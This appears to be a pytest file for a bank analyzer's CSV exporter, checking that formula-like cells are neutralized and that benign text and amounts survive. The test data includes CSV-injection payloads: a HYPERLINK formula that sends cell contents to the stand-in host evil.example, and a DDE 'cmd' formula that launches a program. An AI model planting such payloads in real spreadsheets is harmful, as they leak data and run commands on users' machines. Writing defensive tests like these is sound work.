"""Exported CSV cannot make a spreadsheet run a formula, and benign data survives unchanged."""

from __future__ import annotations

import csv
import io
import sqlite3

import pytest
from hypothesis import given
from hypothesis import strategies as st

from assistant_data import load_history
from bank_analyzer.database.repositories import (
    AccountRepository,
    CategoryRepository,
    TransactionRepository,
)
from bank_analyzer.domain.models import Account
from bank_analyzer.services.exporter import COLUMNS, neutralize_cell, transactions_csv
from fakes import load_transactions

TRIGGERS = "=+-@\t\r\n"


def rows_of(data: bytes) -> list[list[str]]:
    assert data.startswith(b"\xef\xbb\xbf")
    return list(csv.reader(io.StringIO(data.decode("utf-8-sig"), newline="")))


class TestNeutralizeCell:
    @pytest.mark.parametrize(
        "value",
        [
            "=1+1",
            "+SUM(A1)",
            "-2+3",
            "@SUM(1)",
            "\t=1",
            "\r=1",
            "\n=1",
            "  =1+1",
            '=HYPERLINK("http://evil.example","x")',
            "=cmd|' /C calc'!A0",
            "-1",
        ],
    )
    def test_formula_like_text_gets_a_prefix(self, value: str) -> None:
        assert neutralize_cell(value) == "'" + value

    @pytest.mark.parametrize(
        "value", ["", "GROCERY MART", "Café", "a=b", "5 + 5", "x-y", "'quoted"]
    )
    def test_ordinary_text_is_unchanged(self, value: str) -> None:
        assert neutralize_cell(value) == value

    @given(st.text(max_size=60))
    def test_no_result_starts_with_a_trigger(self, value: str) -> None:
        out = neutralize_cell(value)
        assert not out or out[0] not in TRIGGERS
        assert not out.lstrip(" ") or out.lstrip(" ")[0] not in TRIGGERS


@pytest.fixture
def hostile(conn: sqlite3.Connection, usd_account: Account) -> bytes:
    load_transactions(
        conn,
        usd_account.id,
        [
            {
                "desc": '=HYPERLINK("http://evil.example/?"&A1,"click")',
                "amount": -1000,
                "day": "2024-02-01",
            },
            {"desc": "+cmd|' /C calc'!A0", "amount": -2000, "day": "2024-02-02"},
            {"desc": "@SUM(1+1)", "amount": 3000, "day": "2024-02-03"},
            {"desc": "-3+4", "amount": -4000, "day": "2024-02-04"},
            {"desc": 'Café Münch, "quoted"\nnewline', "amount": -550, "day": "2024-02-05"},
        ],
    )
    categories = {c.id: c for c in CategoryRepository(conn).list(active_only=False)}
    accounts = {a.id: a.alias for a in AccountRepository(conn).list()}
    txns = TransactionRepository(conn).fetch_all()
    return transactions_csv(txns, categories, accounts)


class TestExport:
    def test_header_and_row_count(self, hostile: bytes) -> None:
        rows = rows_of(hostile)
        assert tuple(rows[0]) == COLUMNS
        assert len(rows) == 6

    def test_no_text_cell_can_start_a_formula(self, hostile: bytes) -> None:
        rows = rows_of(hostile)
        text_columns = [COLUMNS.index(c) for c in ("Account", "Description", "Category")]
        for row in rows[1:]:
            for index in text_columns:
                cell = row[index]
                assert not cell or cell.lstrip(" ")[0] not in TRIGGERS, cell

    def test_dangerous_descriptions_are_kept_but_defused(self, hostile: bytes) -> None:
        descriptions = {r[2] for r in rows_of(hostile)[1:]}
        assert '\'=HYPERLINK("http://evil.example/?"&A1,"click")' in descriptions
        assert "'+cmd|' /C calc'!A0" in descriptions
        assert "'@SUM(1+1)" in descriptions
        assert "'-3+4" in descriptions

    def test_amounts_stay_numbers(self, hostile: bytes) -> None:
        amounts = sorted(r[3] for r in rows_of(hostile)[1:])
        assert amounts == ["-10.00", "-20.00", "-40.00", "-5.50", "30.00"]
        for value in amounts:
            float(value)  # parses as a number: no apostrophe was added

    def test_benign_text_round_trips_exactly(self, hostile: bytes) -> None:
        descriptions = {r[2] for r in rows_of(hostile)[1:]}
        assert 'Café Münch, "quoted"\nnewline' in descriptions

    def test_a_full_history_exports_every_row(
        self, conn: sqlite3.Connection, usd_account: Account
    ) -> None:
        load_history(conn, usd_account)
        categories = {c.id: c for c in CategoryRepository(conn).list(active_only=False)}
        rows = rows_of(transactions_csv(TransactionRepository(conn).fetch_all(), categories))
        assert len(rows) == 16
        assert {r[5] for r in rows[1:]} >= {"Salary", "Groceries", ""}
